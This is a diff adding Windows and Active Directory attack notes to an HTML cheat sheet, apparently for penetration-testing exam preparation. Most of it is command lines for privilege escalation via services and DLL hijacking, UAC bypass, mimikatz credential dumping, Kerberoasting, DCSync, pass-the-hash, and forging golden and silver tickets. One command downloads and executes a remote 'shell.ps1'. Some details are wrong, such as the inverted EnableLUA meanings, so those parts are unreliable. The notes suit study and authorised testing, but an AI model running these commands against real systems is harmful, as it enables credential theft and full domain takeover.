@@ -1108,17 +1108,710 @@
         </ul>
     </ul>
     <li>Unquoted Service Path</li>
+    <ul>
+        <li>Try to raplce a path location to a reverse shell executable</li>
+        <ul>
+            <li>Example</li>
+            <ul>
+                <li>C:\Program Files\Unquoted Path Service\Common Files\originalservice.exe</li>
+                <ul>
+                    <li>windows would try to execute "Program" first, then "Unquoted", then "Common", and finally "originalservice.exe"</li>
+                    <ul>
+                        <li>If we can create a reverse shell named "Program.exe", "Unquoted.exe", etc, we can get reverse shell</li>
+                    </ul>
+                </ul>
+            </ul>
+        </ul>
+    </ul>
+    <li>Weak Registry Permissions</li>
+    <ul>
+        <li>INTERACTIVE group includes all users that can login locally</li>
+    </ul>
+    <table>
+        <tr>
+            <td>Check registry permissions using PowerShell</td>
+            <td>Get-Acl HKLM:\registry\directory | format-list</td>
+        </tr>
+        <tr>
+            <td>Check permissions using accesschk.exe</td>
+            <td>accesschk.exe /accepteula -uvwqk HKLM\registry\directory</td>
+        </tr>
+        <tr>
+            <td>Check current values in registry entry</td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Method 1</td>
+                        <td>reg query HKLM\System\CurrentControlSet\services\&lt;service&gt;</td>
+                    </tr>
+                    <tr>
+                        <td>Method 2</td>
+                        <td>Get-Item HKLM:\System\CurrentControlSet\Services\&lt;service&gt;</td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>Change registry value</td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Method 1</td>
+                        <td>reg add HKLM\service\path  /v ImagePath /t REG_EXPAND_SZ /d D:\PrivEsc\shell4444.exe /f</td>
+                    </tr>
+                    <tr>
+                        <td>Method 2</td>
+                        <td>Set-ItemProperty -path HKLM:\System\CurrentControlSet\Services\&lt;service&gt; -Name ImagePath -Value &quot;&lt;executable&gt;&quot;</td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+    </table>
+    <li>Insecure Service Executables</li>
+    <ul>
+        <li>If able, replace original service executable with our own.</li>
+    </ul>
+    <table>
+        <tr>
+            <td>Check for access with accesschk.exe</td>
+            <td>accesschk.exe /accepteula -quvw "C:\&lt;executable&gt;"</td>
+        </tr>
+        <tr>
+            <td>Check access with icacls</td>
+            <td>Icacls "C:\&lt;executable&gt;"</td>
+        </tr>
+    </table>
+    <li>DLL Hijacking</li>
+    <ul>
+        <li>Enumerate non-windows services to see which one we are able to start/stop</li>
+        <li>Analyze the service executable using procmon and implement a malicious .dll file:</li>
+        <ul>
+            <li>Download executable</li>
+            <li>Open procmon</li>
+            <li>Stop and clear capture</li>
+            <li>Push ctrl + L - drop down menu for "Process Name" - enter process name - push add & OK</li>
+            <li>Deselect "show registry activity" & "show network activity"</li>
+            <li>Start capture</li>
+            <li>Look for dll's that are attempted to be executed but do not exist.  Put a reverse shell .dll in that directory</li>
+        </ul>
+        <li>Start the vulnerable service</li>
+    </ul>
+
+    <h2>Scheduled Tasks</h2>
+    <li>Tasks run at time intervals or by events (log-on, etc)</li>
+    <li>Tasks run with privileges of user who created them.</li>
+    <ul>
+        <li>Administrator can set tasks to run as other users.</li>
+    </ul>
+    <li>List all scheduled tasks your user can see:</li>
+    <ul>
+        <li>Schtasks /query /fo LIST /v</li>
+        <li>Get-ScheduledTask| where {$_.TaskPath-notlike"\Microsoft*"} | ft TaskName,TaskPath,State</li>
+    </ul>
+    <li>Usually need to look for tasks based on other clues like finding a script or log file that shows a scheduled task is being run.</li>
+    <li>look for a script running on a schedule and modify it with some malicious action.  Look into interesting directories.</li>
+</ul>
+
+<h2>Bypass UAC</h2>
+<li>UAC Bypass requires administrator account</li>
+<li>Check if UAC is on</li>
+<ul>
+    <li>reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System</li>
+    <ul>
+        <li>EnableLUA</li>
+        <ul>
+            <li>0 = UAC enabled, no bypass needed, can PsExec to SYSTEM</li>
+            <li>1 = UAC disabled, need to check the other 2 keys</li>
+        </ul>
+        <li>ConsentPromptBehaviorAdmin</li>
+        <ul>
+            <li>Can take on 6 different values</li>
+        </ul>
+        <li>PromptOnSecureDesktop</li>
+        <ul>
+            <li>Either 1 or 0</li>
+        </ul>
+        <li>If ConsentPromptBehaviorAdmin=2 & PromptOnSecureDesktop=1 then UAC bypass will not work</li>
+        <li>If ConsentPromptBehaviorAdmin=5 & PromptOnSecureDesktop=1 then UAC bypass will work</li>
+    </ul>
+</ul>
+
+<li>ConsentPromptBehaviorAdmin Values:</li>
+<table>
+    <tr>
+        <td>Value</td>
+        <td>Meaning</td>
+    </tr>
+    <tr>
+        <td>0x00000000</td>
+        <td>This option allows the Consent Admin to perform an operation that requires elevation without consent or credentials.</td>
+    </tr>
+    <tr>
+        <td>0x00000001</td>
+        <td>This option prompts the Consent Admin to enter his or her user name and password (or another valid admin) when an operation requires elevation of privilege. This operation occurs on the secure desktop.</td>
+    </tr>
+    <tr>
+        <td>0x00000002</td>
+        <td>This option prompts the administrator in Admin Approval Mode to select either "Permit" or "Deny" an operation that requires elevation of privilege. If the Consent Admin selects Permit, the operation will continue with the highest available privilege. "Prompt for consent" removes the inconvenience of requiring that users enter their name and password to perform a privileged task. This operation occurs on the secure desktop.</td>
+    </tr>
+    <tr>
+        <td>0x00000003</td>
+        <td>This option prompts the Consent Admin to enter his or her user name and password (or that of another valid admin) when an operation requires elevation of privilege.</td>
+    </tr>
+    <tr>
+        <td>0x00000004</td>
+        <td>This prompts the administrator in Admin Approval Mode to select either "Permit" or "Deny" an operation that requires elevation of privilege. If the Consent Admin selects Permit, the operation will continue with the highest available privilege. "Prompt for consent" removes the inconvenience of requiring that users enter their name and password to perform a privileged task.</td>
+    </tr>
+    <tr>
+        <td>0x00000005</td>
+        <td>This option is the default. It is used to prompt the administrator in Admin Approval Mode to select either "Permit" or "Deny" for an operation that requires elevation of privilege for any non-Windows binaries. If the Consent Admin selects Permit, the operation will continue with the highest available privilege. This operation will happen on the secure desktop.</td>
+    </tr>
+</table>
+
+<li>Eventvwr.exe UAC bypass:</li>
+<ul>
+    <li>Works on Windows 7, 8, and 10.  Does not work on Vista</li>
+    <li>Guide: https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/</li>
+    <li>Exploit in C (requires minimal editing) - https://github.com/turbo/zero2hero</li>
+</ul>
+
+<li>Pre-made UAC bypass executables on Kali</li>
+<ul>
+    <li>bypassuac-x86.exe & bypassuac-x64.exe</li>
+    <li>Same limitations as eventvwr.exe UAC bypass</li>
+    <li>bypassuac-x**.exe /c C:\directory\to\shell4444.exe</li>
+</ul>
+
+<h2>Finding logged in users</h2>
+
+<li>Enumerate Logged on Users</li>
+<ul>
+    <li>Individual Workstation</li>
+    <ul>
+        <li>NetWkstaUserEnum</li>
+        <ul>
+            <li>Requires admin privileges</li>
+        </ul>
+        <li>Powerview.ps1</li>
+        <ul>
+            <li>Get-NetLoggedon –ComputerName &lt;workstation name&gt;</li>
+        </ul>
+    </ul>
+    <li>Domain Enumeration</li>
+    <ul>
+        <li>NetSessionEnum</li>
+        <ul>
+            <li>Enumerate active sessions on domain joined machines</li>
+            <li>Does not require admin privileges</li>
+            <li>Use against file servers and domain controllers</li>
+            <li>Powerview.ps1</li>
+            <ul>
+                <li>Get-NetSession</li>
+                <ul>
+                    <li>Get-NetSession –ComputerName &lt;domain controller or server &ndash; ex. dc01&gt;</li>
+                </ul>
+            </ul>
+        </ul>
+    </ul>
+</ul>
 
 
+<h2>Security Identifier (SID)</h2>
 
+<li>Every account has one.</li>
+<ul>
+    <li>There is a separate one for each account that is used for elevated privileges (UAC)</li>
+</ul>
+<li>Windows refers to accounts by SIDs, people refer to accounts by account names</li>
+<li>All SIDs start with S-1-5-21</li>
+<ul>
+    <li>Admin always ends in 500</li>
+    <li>Guest always ends in 501</li>
+    <li>S-1-5-19 is the LocalSystem account</li>
+</ul>
 
+<li>Example SID: S-1-5-21-1180699209-877415012-3182924384-1004</li>
+<table>
+    <tr>
+        <td>S</td>
+        <td>1</td>
+        <td>5</td>
+        <td>21-1180699209-877415012-3182924384</td>
+        <td>1004</td>
+    </tr>
+    <tr>
+        <td>Indicates this is a SID</td>
+        <td>SID specification version number</td>
+        <td>Identifier authority</td>
+        <td>Domain or local computer identifier</td>
+        <td>Relative ID</td>
+    </tr>
+</table>
 
+<h2>Clock Skew</h2>
 
+<li>Fix clock skew</li>
+<ul>
+    <li>Check clock skew</li>
+    <ul>
+        <li>nmap</li>
+        <ul>
+            <li>sudo nmap -p445 -sV -sC &lt;ip address&gt;</li>
+            <li>Look for clock-skew: mean: &lt;value&gt; deviation: &lt;clock skew time&gt; median: &lt;value&gt;</li>
+        </ul>
+    </ul>
+    <li>Check local time (on Kali)</li>
+    <ul>
+        <li>date</li>
+    </ul>
+    <li>Change local time (on Kali)</li>
+    <ul>
+        <li>date -s &lt;Time&gt;</li>
+        <ul>
+            <li>&lt;Time&gt; Format</li>
+            <ul>
+                <li>HH:MM:SS</li>
+            </ul>
+        </ul>
+    </ul>
+</ul>
 
+<h2>Dump Hashes</h2>
 
+<li>Dumped hash format</li>
+<ul>
+    <li>Username:#:LM HASH:NTLM HASH:::</li>
+</ul>
 
+<li>SAM, SYSTEM, and SECURITY Location</li>
+<ul>
+    <li>C:\Windows\System32\config\</li>
+    <li>Backup Locations</li>
+    <ul>
+        <li>C:\Windows\System32\config\RegBack</li>
+        <li>C:\Windows\Repair</li>
+    </ul>
+    <li>reg save HKLM\&lt;file&gt; &lt;Out file&gt;</li>
+</ul>
 
+<li>mimikatz</li>
+<ul>
+    <li>Extracts hashes from the Local Security Authority Subsystem (LSASS)</li>
+    <li>Dump creds/hashes</li>
+    <ul>
+        <li>Summary</li>
+        <ul>
+            <li>privilege::debug</li>
+            <li>token::elevate</li>
+            <li>lsadump::sam</li>
+            <li>sekurlsa::logonpasswords</li>
+        </ul>
+        <li>Explained/Detailed</li>
+        <ul>
+            <li>Mimikatz must be launched from an administrative command prompts</li>
+            <ul>
+                <li>Must first execute two commands:</li>
+                <ul>
+                    <li>privilege::debug – enables SeDebugPrivilege</li>
+                    <ul>
+                        <li>If fails, mimikatz was most likely not executed with admin privileges</li>
+                    </ul>
+                    <li>token::elevate</li>
+                    <ul>
+                        <li>Elevates mimikatz security token from administrator to SYSTEM</li>
+                        <li>If mimikatz is launched from a SYSTEM shell, this step can be skipped</li>
+                    </ul>
+                </ul>
+                <li>Dump SAM contents (Security Account Manager)</li>
+                <ul>
+                    <li>lsadump::sam</li>
+                </ul>
+                <li>Dump NTLM hash</li>
+                <ul>
+                    <li>sekurlsa::logonpasswords</li>
+                    <ul>
+                        <li>This will dump the credentials of all users currently logged into the workstation or server.</li>
+                        <ul>
+                            <li>Includes remote logins like RDP sessions</li>
+                        </ul>
+                        <li>If WDigest is enabled Mimikatz will reveal cleartext passwords alongside hashes (Windows 7)</li>
+                    </ul>
+                </ul>
+            </ul>
+        </ul>
+    </ul>
+    <li>ERROR kuhl_m_sekurlsa_acquireLSA; Key import</li>
+    <ul>
+        <li>Newer Windows update makes it so mimikatz versions 2.2.0 and newer do not work.  Must use an older version of mimikatz.</li>
+        <ul>
+            <li>https://gitlab.com/kalilinux/packages/mimikatz/-/tree/d72fc2cca1df23f60f81bc141095f65a131fd099/</li>
+        </ul>
+    </ul>
+</ul>
 
+<li>Other tools such as samdump2, pwdump, fgdump, and Windows Credential Editor (wce) work well against older Windows OS's such as XP or Server 2003</li>
+
+<li>impacket-secretsdump</li>
+<ul>
+    <li>Dump hashes locally</li>
+    <ul>
+        <li>impacket-secretsdump -sam &lt;SAM file&gt; -security &lt;SECURITY file&gt; [-system &lt;SYSTEM file&gt;] LOCAL</li>
+    </ul>
+</ul>
+
+<h2>Active Directory</h2>
+
+<li>Authentication</li>
+<ul>
+    <li>NTLM</li>
+    <ul>
+        <li>Used when clients authenticate to a server by IP (instead of hostname) or if a user attempts to authenticate to a hostname that is not registered on the AD DNS server.  3rd party applications can also choose NTLM instead of Kerberos.</li>
+        <li>NTLM hashes can be cracked very quickly</li>
+    </ul>
+    <li>Kerberos</li>
+</ul>
+
+<li>ntds.dit file</li>
+<ul>
+    <li>Database stored on DC that contains all active directory information including password hashes for all users in the domain</li>
+    <li>C:\windows\ntds\</li>
+    <li>Can use SYSTEM file to decrypt the ntds.dit and extract all the information from it</li>
+    <ul>
+        <li>impacket-secretsdump -ntds &lt;ntds.dit file&gt; -system &lt;SYSTEM file&gt; [-security &lt;SECURITY file&gt;] LOCAL</li>
+        <ul>
+            <li>Additional Useful flags:</li>
+            <ul>
+                <table>
+                    <tr>
+                        <td>-pwd-last-set</td>
+                        <td>If user has multiple accounts and changes password in same timeframe then likey all passwords are the same </td>
+                    </tr>
+                    <tr>
+                        <td>-user-status</td>
+                        <td>Tells if the account is disabled or not</td>
+                    </tr>
+                    <tr>
+                        <td>-history</td>
+                        <td>Windows will show the last 24 used passwords for each user</td>
+                    </tr>
+                </table>
+            </ul>
+            <li>Grep the ntds dump</li>
+            <ul>
+                <li>grep -v 'aes[12]\|des-cbc</li>
+                <li>grep -v history0</li>
+            </ul>
+        </ul>
+    </ul>
+</ul>
+
+<li>Brute force valid users amd pre-auth attack</li>
+<ul>
+    <li>kerbrute</li>
+    <ul>
+        <li>pre-auth attack tool.  Will validate user existence.</li>
+        <li>Can lock out users but will not generate 4625 event code which is logged by default.  The event code it does generate is not logged by default.</li>
+        <li>kerberute userenum --dc apt -d &lt;domain&gt; &lt;user list&gt;</li>
+    </ul>
+</ul>
+
+<li>Kerberoast</li>
+<ul>
+    <li>Mimikatz/manual</li>
+    <table>
+        <tr>
+            <td>Purge all current tickets</td>
+            <td>kerberos::purge</td>
+        </tr>
+        <tr>
+            <td>Enumerate SPNs</td>
+            <td>GetUserSPNs.ps1</td>
+        </tr>
+        <tr>
+            <td>Request security token for SPN</td>
+            <td>
+                <li>Add-Type -AssemblyName System.IdentityModel</li>
+                <li>New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &#039;&lt;SPN - Example:HTTP/CorpWebServer.corp.com&gt;'</li>
+            </td>
+        </tr>
+        <tr>
+            <td>export TGS ticket</td>
+            <td>kereberos::list /export or PS > klist</td>
+        </tr>
+        <tr>
+            <td>Turn output into hashcat hash</td>
+            <td>kirbi2hashcat</td>
+        </tr>
+    </table>
+    <li>Rubeus</li>
+    <ul>
+        <li>.\r.exe kerberoast /creduser:domain\&lt;user&gt; /credpassword:&lt;password&gt;</li>
+    </ul>
+    <li>GetUserSPNs.py</li>
+    <table>
+        <tr>
+            <td>Forward port 88 & 389 to Kali</td>
+            <td>chisel.exe client 10.10.14.4:8008 R:88:127.0.0.1:88 R:389:localhost:389</td>
+        </tr>
+        <tr>
+            <td>Get hash for kerberoastable users</td>
+            <td>GetUserSPNs.py -request -dc-ip 127.0.0.1 &lt;domain&gt;/&lt;user&gt;</td>
+        </tr>
+    </table>
+</ul>
+
+<li>DCSync</li>
+<ul>
+    <li>Retrieve all domain password data via domain replication protocols.</li>
+    <li>Tools/Methods</li>
+    <ul>
+        <li>Impacket-SecretsDump &#039;&lt;username&gt;:&lt;password&gt;@&lt;ip address&gt;&#039;</li>
+        <ul>
+            <li>Attack remotely.  Generates network traffic.  Does not have to deal with AV or other problems on victim machine.</li>
+        </ul>
+        <li>.\Mimikatz.exe 'lsadump::dcsync /domain:&lt;domain name&gt; /user:administrator&#039; exit</li>
+        <ul>
+            <li>Attack locally.  Reduced network traffic.</li>
+        </ul>
+    </ul>
+</ul>
+
+<li>Brute force credentials with smb and winrm</li>
+<ul>
+    <li>crackmapexec winrm/smb -u &lt;username&gt; -p &lt;password&gt; or -H &lt;hash&gt;</li>
+    <ul>
+        <li>SMB brute forcing can be detected and banned by some AD setups</li>
+    </ul>
+</ul>
+
+<li>Enumerating AD Users and Groups</li>
+<table>
+    <tr>
+        <td>net user</td>
+        <td>Shows local user accounts</td>
+    </tr>
+    <tr>
+        <td>net user /domain</td>
+        <td>Shows all domain user accounts</td>
+    </tr>
+    <tr>
+        <td>net user &lt;user&gt; /domain</td>
+        <td>Shows all domain user accounts</td>
+    </tr>
+    <tr>
+        <td>net group /domain</td>
+        <td>Shows all groups on the domain</td>
+    </tr>
+</table>
+
+<h2>Credential Usage</h2>
+
+<table>
+    <tr>
+        <td>
+            <li>impacket-psexec</li>
+            <ul>
+                <li>If user has ability to write to a SMB share</li>
+            </ul>
+            <li>impacket-wmiexec uses same syntax</li>
+            <ul>
+                <li>wmiexec does not require writing to SMB</li>
+            </ul>
+        </td>
+        <td>
+            <li>impacket-psexec &lt;username&gt;@&lt;ip address&gt; -hashes LM:NTLM</li>
+            <li>impacket-psexec &lt;username&gt;:&lt;password&gt;@&lt;ip address&gt;</li>
+            <li>impacket-psexec &lt;username&gt;@&lt;ip address&gt;</li>
+            <ul>
+                <li>Will prompt for password.  Works when password has bad characters that are throwing off the command.</li>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            <li>Run powershell command as other user</li>
+        </td>
+        <td>
+            <table>
+                <tr>
+                    <td>Method 1</td>
+                    <td>Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://<ip address>/shell.ps1')" -Credential $cred</td>
+                    </tr>
+                    <tr>
+                        <td>Method 2</td>
+                        <td>Invoke-Command -ComputerName &lt;computer name&gt; -Credential $cred -ScriptBlock {whoami}</td>
+                    </tr>
+                    <tr>
+                        <td>Method 3</td>
+                        <td>
+                            <li>Powershell-Suite/Runas.ps1</li>
+                            <li>Invoke-RunAs -User &lt;username&gt; -Password &lt;password&gt; -LogonType &lt;0x1 or 0x2&gt; -Binary powershell.exe -Args &lt;powershell command&gt;</li>
+                        </td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>Pass the hash</td>
+            <td>
+                <li>pth-winexe - Pass the hash</li>
+                <ul>
+                    <li>Used to authenticate via the SMB protocol</li>
+                    <li>Example: pth-winexe &ndash;U &lt;username&gt;%&lt;hash - Must be formatted LM_Hash:NT_Hash&gt; //&lt;ip address&gt; cmd</li>
+                </ul>
+            </td>
+        </tr>
+        <tr>
+            <td>
+                <li>winexe - password</li>
+            </td>
+            <td>
+                <li>winexe -U &#039;&lt;username&gt;%&lt;password&gt;&#039; //&lt;ip address&gt; cmd.exe</li>
+                <li>winexe -U &#039;&lt;username&gt;%&lt;password&gt;&#039; --system //&lt;ip address&gt; cmd.exe</li>
+            </td>
+        </tr>
+        <tr>
+            <td>evil-winrm</td>
+            <td>
+                <li>evil-winrm -i &lt;ip address&gt; -u &lt;user&gt; -p &lt;password&gt;</li>
+                <li>evil-winrm -i &lt;ip address&gt; -u &lt;user&gt; -H &lt;NTLM&gt;</li>
+            </td>
+        </tr>
+    </table>
+
+    <h2>Overpass the Hash</h2>
+
+    <li>Turn NTLM hash into Kerberos ticket to avoid the use of NTLM authentication</li>
+    <ul>
+        <li>Retrieve NTLM hash for user</li>
+        <ul>
+            <li>Mimikatz</li>
+            <ul>
+                <li>Privilege::debug</li>
+                <li>Sekurlsa::logonpasswords</li>
+            </ul>
+        </ul>
+        <li>Authenticate with NTLM hash – Powershell session under context of other user</li>
+        <ul>
+            <li>Mimikatz</li>
+            <ul>
+                <li>Sekurlsa::pth /user:&lt;username&gt; /domain:&lt;domain &ndash; ex. Corp.com&gt; /ntlm:&lt;NTLM hash&gt; /run:powershell.exe</li>
+            </ul>
+        </ul>
+        <li>Generate TGT by authenticating to a network share on DC – can use any command that requires domain permissions</li>
+        <ul>
+            <li>Net use \\&lt;Domain Controller &ndash; ex. dc01&gt;</li>
+        </ul>
+        <li>Check for cached Kerberos ticket</li>
+        <ul>
+            <li>Klist</li>
+        </ul>
+        <li>Run PsExec inside powershell session that is running under context of other user</li>
+        <ul>
+            <li>.\PsExec.exe \\&lt;domain controller &ndash; ex. dc01&gt; cmd.exe</li>
+        </ul>
+    </ul>
+
+    <h2>Silver Ticket</h2>
+    <li>Forge TGS using a service account password or NTLM hash in order to access any resources that the service account has permissions to</li>
+    <li>If the SPN is used on multiple servers the ticket can be leveraged against them all.</li>
+    <li>Creation Instructions</li>
+    <ul>
+        <li>Get domain SID</li>
+        <ul>
+            <li>Whoami /user</li>
+            <ul>
+                <li>SID is everything except the last section of digits</li>
+            </ul>
+        </ul>
+        <li>mimikatz</li>
+        <ul>
+            <li>Get rid of pre-existing kerberos tickets</li>
+            <ul>
+                <li>Kerberos::purge</li>
+            </ul>
+            <li>Verify Kerberos tickets are purged</li>
+            <ul>
+                <li>Kerberos::list</li>
+            </ul>
+            <li>Forge silver ticket</li>
+            <ul>
+                <li>Kerberos::golden /user:&lt;username&gt; /domain:&lt;domain ex. corp.com&gt; /sid:&lt;domain SID &ndash; whoami /user SID except last section of #&#039;s&gt; target:&lt;fully qualified host name of service &ndash; ex. CorpWebServer.corp.com&gt; /service:&lt;service type &ndash; ex. HTTP&gt; /rc4:&lt;service account hash&gt; /ppt (inject into memory)</li>
+                <ul>
+                    <li>Rc4/hash section requires knowledge of service account password.  If password is known, we can hash it.</li>
+                </ul>
+            </ul>
+        </ul>
+        <li>Verify ticket has been created</li>
+        <ul>
+            <li>Kerberos::list</li>
+        </ul>
+    </ul>
+
+    <h2>Golden Ticket</h2>
+
+    <li>Gives access to anything and everything</li>
+    <li>Requires the password or hash for the service account krbtgt</li>
+    <li>Must have access to an account that is a member of the domain admins group or have access to the domain controller itself.</li>
+    <li>Creating the golden ticket does not require admin privileges and can be performed on a computer not joined to the domain.</li>
+    <li>Creating golden ticket on Linux</li>
+    <ul>
+        <li>Get krbtgt hash</li>
+        <ul>
+            <li>impacket-SecretsDump</li>
+        </ul>
+        <li>Get domain SID</li>
+        <ul>
+            <li>On Windows</li>
+            <ul>
+                <li>PS > Get-ADDomain &lt;Domain&gt;</li>
+            </ul>
+        </ul>
+        <li>impacket-ticketer</li>
+        <ul>
+            <li>impacket-ticketer -nthash &lt;krbtgt ntlm hash&gt; -domain-sid &lt;domain sid&gt; -domain &lt;Domain Name&gt; &lt;Username&gt;</li>
+            <ul>
+                <li></li>
+            </ul>
+        </ul>
+        <li>export KRB5CCNAME=&lt;output .cache file from impacket-ticketer command&gt;</li>
+        <li>psexec &lt;domain&gt;/&lt;username&gt;@&lt;ip address&gt; -k -no-pass</li>
+        <ul>
+            <li>Try adding domain names to /etc/host file before running</li>
+            <ul>
+                <li>Try DNS names instead of ip address in command</li>
+            </ul>
+            <li>psexec will always login as SYSTEM</li>
+            <ul>
+                <li>switch to wmiexec to login as Administrator instead of SYSTEM</li>
+            </ul>
+        </ul>
+    </ul>
+
+    <li>Creating the golden ticket on windows</li>
+    <ul>
+        <li>Get domain SID & krbtgt hash</li>
+        <ul>
+            <li>mimikatz: privilege::debug</li>
+            <li>mimikatz: lsadump::lsa /patch</li>
+        </ul>
+        <li>Purge kerberos tickets</li>
+        <ul>
+            <li>mimikatz: kerberos::purge</li>
+        </ul>
+        <li>Create golden ticket</li>
+        <ul>
+            <li>mimikatz: kerberos::golden /user:fakeuser /domain:corp.com /sid:s-1-5-&lt;sid&gt; /krbtgt:&lt;krbtgt hash /ptt&gt;</li>
+        </ul>
+        <li>Launch new command prompt</li>
+        <ul>
+            <li>misc::cmd</li>
+        </ul>
+        <li>Attempt lateral movement with psexec</li>
+        <ul>
+            <li>Psexec.exe \\&lt;domain controller&gt; cmd.exe</li>
+        </ul>
+    </ul>
 
 </body>
 </html>
